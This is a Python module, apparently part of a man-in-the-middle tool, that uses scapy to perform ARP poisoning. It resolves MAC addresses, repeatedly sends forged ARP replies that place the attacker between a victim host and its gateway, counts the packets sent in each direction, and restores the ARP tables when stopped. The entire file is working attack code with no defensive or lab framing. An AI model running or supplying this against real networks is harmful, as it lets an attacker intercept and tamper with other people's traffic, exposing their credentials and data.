"""ARP poisoning / restoration, with per-direction send counters."""
from __future__ import annotations
import logging
import threading
import time
from typing import Optional

log = logging.getLogger("mitm.arp")


def get_mac(ip: str, iface: str, timeout: float = 2.0) -> Optional[str]:
    try:
        from scapy.all import ARP, Ether, srp  # type: ignore
    except Exception as e:
        log.error("scapy unavailable: %s", e)
        return None
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=timeout, verbose=False, iface=iface,
        )
        for _, rcv in ans:
            return rcv.hwsrc.upper()
    except Exception as e:
        log.warning("ARP resolve failed for %s: %s", ip, e)
    return None


def send_poison(victim_ip, victim_mac, gateway_ip, gateway_mac,
                attacker_mac, iface) -> bool:
    try:
        from scapy.all import ARP, Ether, sendp  # type: ignore
    except Exception:
        return False
    try:
        to_victim = (
            Ether(src=attacker_mac, dst=victim_mac)
            / ARP(op=2, psrc=gateway_ip, hwsrc=attacker_mac,
                  pdst=victim_ip, hwdst=victim_mac)
        )
        to_gateway = (
            Ether(src=attacker_mac, dst=gateway_mac)
            / ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac,
                  pdst=gateway_ip, hwdst=gateway_mac)
        )
        sendp([to_victim, to_gateway], iface=iface, verbose=False)
        return True
    except Exception as e:
        log.warning("ARP poison send failed: %s", e)
        return False


def send_restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface) -> None:
    try:
        from scapy.all import ARP, Ether, sendp  # type: ignore
    except Exception:
        return
    try:
        to_victim = (
            Ether(src=gateway_mac, dst=victim_mac)
            / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
                  pdst=victim_ip, hwdst=victim_mac)
        )
        to_gateway = (
            Ether(src=victim_mac, dst=gateway_mac)
            / ARP(op=2, psrc=victim_ip, hwsrc=victim_mac,
                  pdst=gateway_ip, hwdst=gateway_mac)
        )
        for _ in range(3):
            sendp([to_victim, to_gateway], iface=iface, verbose=False)
            time.sleep(0.2)
        log.info("ARP state restored for victim=%s gateway=%s", victim_ip, gateway_ip)
    except Exception as e:
        log.warning("ARP restore failed: %s", e)


class ArpPoisoner(threading.Thread):
    """Sends poison pairs on a loop. Tracks per-direction counters."""

    def __init__(self, victim_ip, victim_mac, gateway_ip, gateway_mac,
                 attacker_mac, iface, interval: float = 1.5):
        super().__init__(daemon=True)
        self.victim_ip = victim_ip
        self.victim_mac = victim_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.attacker_mac = attacker_mac
        self.iface = iface
        self.interval = interval
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self._stats = {
            "to_victim_count": 0,
            "to_gateway_count": 0,
            "to_victim_last": 0.0,
            "to_gateway_last": 0.0,
        }

    def stop(self) -> None:
        self._stop.set()

    def stats(self) -> dict:
        with self._lock:
            return dict(self._stats)

    def run(self) -> None:
        log.info("ARP poisoner started (victim=%s gw=%s iface=%s)",
                 self.victim_ip, self.gateway_ip, self.iface)
        while not self._stop.is_set():
            ok = send_poison(self.victim_ip, self.victim_mac,
                             self.gateway_ip, self.gateway_mac,
                             self.attacker_mac, self.iface)
            if ok:
                now = time.time()
                with self._lock:
                    self._stats["to_victim_count"] += 1
                    self._stats["to_gateway_count"] += 1
                    self._stats["to_victim_last"] = now
                    self._stats["to_gateway_last"] = now
            self._stop.wait(self.interval)

        send_restore(self.victim_ip, self.victim_mac,
                     self.gateway_ip, self.gateway_mac, self.iface)
        log.info("ARP poisoner stopped")